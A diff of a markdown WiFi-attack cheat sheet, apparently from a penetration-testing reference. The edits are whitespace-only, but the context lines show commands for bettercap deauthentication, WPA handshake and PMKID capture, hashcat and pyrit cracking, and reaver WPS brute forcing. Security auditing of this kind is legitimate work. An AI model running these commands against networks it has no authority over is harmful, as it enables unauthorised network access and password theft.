@@ -5,7 +5,6 @@
 * [aircrack-ng/aircrack-ng](https://github.com/aircrack-ng/aircrack-ng) - WiFi security auditing tools suite
 * [bettercap/bettercap](https://github.com/bettercap/bettercap)
 
-
 ## WPA PSK Attack
 
 ### Cracking WPA with John the Ripper
@@ -99,10 +98,10 @@ pyrit batch
 pyrit -r wpastripped.cap attack_db 
 ```
 
-
 ### Cracking WPA with bettercap
 
 * Install Bettercap
+
     ```powershell
     # install and update
     go get github.com/bettercap/bettercap
@@ -112,6 +111,7 @@ pyrit -r wpastripped.cap attack_db
     ```
 
 * Scan for Wifi networks
+
     ```ps1
     # run and recon the wifi APs
     sudo bettercap -iface wlan0
@@ -127,13 +127,13 @@ pyrit -r wpastripped.cap attack_db
     ```
 
 * Execute the deauth attack
+
     ```powershell
     # use the bssid of the AP
     > wifi.deauth e0:xx:xx:xx:xx:xx
     /path/to/cap2hccapx /root/bettercap-wifi-handshakes.pcap bettercap-wifi-handshakes.hccapx
     /path/to/hashcat -m 2500 -a3 -w3 bettercap-wifi-handshakes.hccapx '?d?d?d?d?d?d?d?d'
     ```
-
 
 ## WPA WPS Attack
 
@@ -175,7 +175,6 @@ reaver -i mon0 -c 6 -b 00:23:69:48:33:95  -vv -L -N -d 15 -T .5 -r 3:15
 
 > Message "WARNING: Detected AP rate limiting, waiting 315 seconds before re-trying" -> AP is protected Message "WARNING: Receive timeout occured" -> AP is too far
 
-
 ## WPA PMKID Attack
 
 ```powershell
@@ -206,14 +205,13 @@ hashcat -m 16800 -d 1 -w 3 myHashes rockyou.txt
 # Check clGetPlatformIDs(): CL_PLATFORM_NOT_FOUND_KHR
 ```
 
-**Bettercap WPA - PMKID attack**
+**Bettercap WPA - PMKID attack**:
 
 ```powershell
 wifi.assoc all
 /path/to/hcxpcaptool -z bettercap-wifi-handshakes.pmkid /root/bettercap-wifi-handshakes.pcap
 /path/to/hashcat -m16800 -a3 -w3 bettercap-wifi-handshakes.pmkid '?d?d?d?d?d?d?d?d'
 ```
-
 
 ## References
 
